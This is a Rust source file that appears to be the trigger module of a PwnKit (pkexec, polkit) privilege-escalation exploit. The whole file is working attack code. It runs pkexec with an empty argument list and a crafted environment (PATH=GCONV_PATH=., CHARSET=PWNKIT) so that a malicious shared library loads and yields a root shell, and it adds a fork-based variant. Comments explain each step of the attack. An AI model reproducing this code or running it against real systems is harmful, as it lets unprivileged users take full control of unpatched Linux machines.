//! Trigger mechanism for PwnKit
//!
//! The core of the exploit:
//! 1. Call execve("/usr/bin/pkexec", [NULL], crafted_envp)
//! 2. argc=0 causes pkexec to read argv[0] from envp[0]
//! 3. pkexec searches PATH for "pwnkit" and overwrites envp[0]
//! 4. This creates GCONV_PATH=./pwnkit in the environment
//! 5. When pkexec prints error, iconv loads our .so

use std::ffi::CString;
use std::ptr;
use log::{debug, info};

pub fn execute() -> Result<(), String> {
    info!("[Trigger] Executing pkexec with crafted environment...");

    // The target binary
    let prog = CString::new("/usr/bin/pkexec")
        .map_err(|_| "Invalid program path")?;

    // argv must be { NULL } - this is the key to the exploit
    // argc = 0 causes the out-of-bounds read
    let argv: [*const libc::c_char; 1] = [ptr::null()];

    // Craft environment variables
    // envp[0] = "pwnkit" - will be read as argv[0], then overwritten
    // envp[1] = "PATH=GCONV_PATH=." - contains our fake PATH
    // envp[2] = "CHARSET=PWNKIT" - triggers iconv charset conversion
    // envp[3] = "SHELL=pwnkit" - may be used by pkexec
    // envp[4] = NULL - terminator
    
    let e0 = CString::new("pwnkit")
        .map_err(|_| "CString error")?;
    
    // The magic: PATH contains "GCONV_PATH=." as a "directory"
    // When pkexec searches PATH for "pwnkit", it finds it at "GCONV_PATH=./pwnkit"
    // This becomes the full path written to envp[0], creating GCONV_PATH=./pwnkit
    let e1 = CString::new("PATH=GCONV_PATH=.")
        .map_err(|_| "CString error")?;
    
    // CHARSET triggers iconv which reads GCONV_PATH
    let e2 = CString::new("CHARSET=PWNKIT")
        .map_err(|_| "CString error")?;
    
    // Fallback shell
    let e3 = CString::new("SHELL=pwnkit")
        .map_err(|_| "CString error")?;

    // For some systems, we need to set this
    let e4 = CString::new("GIO_USE_VFS=local")
        .map_err(|_| "CString error")?;

    let envp: [*const libc::c_char; 6] = [
        e0.as_ptr(),
        e1.as_ptr(),
        e2.as_ptr(),
        e3.as_ptr(),
        e4.as_ptr(),
        ptr::null(),
    ];

    debug!("[Trigger] envp[0] = {:?}", e0);
    debug!("[Trigger] envp[1] = {:?}", e1);
    debug!("[Trigger] envp[2] = {:?}", e2);

    // Execute!
    // If successful, this replaces the current process with root shell
    // If it returns, something went wrong
    let ret = unsafe {
        libc::execve(
            prog.as_ptr(),
            argv.as_ptr(),
            envp.as_ptr(),
        )
    };

    // execve only returns on error
    let err = std::io::Error::last_os_error();
    Err(format!("execve failed ({}): {}", ret, err))
}

/// Alternative trigger using fork to not replace current process
pub fn execute_fork() -> Result<(), String> {
    info!("[Trigger] Forking before exploit...");

    let pid = unsafe { libc::fork() };

    match pid {
        -1 => {
            Err(format!("fork failed: {}", std::io::Error::last_os_error()))
        }
        0 => {
            // Child process - run exploit
            let _ = execute();
            // If we get here, exploit failed
            unsafe { libc::_exit(1) };
        }
        _ => {
            // Parent - wait for child
            let mut status: libc::c_int = 0;
            unsafe { libc::waitpid(pid, &mut status, 0) };
            
            // Manual status parsing (portable, doesn't rely on libc macros)
            // WIFEXITED: (status & 0x7f) == 0
            // WEXITSTATUS: (status >> 8) & 0xff
            let exited = (status & 0x7f) == 0;
            let exit_code = (status >> 8) & 0xff;
            
            if exited && exit_code == 0 {
                Ok(())
            } else {
                Err(format!("Child failed (exited={}, code={})", exited, exit_code))
            }
        }
    }
}

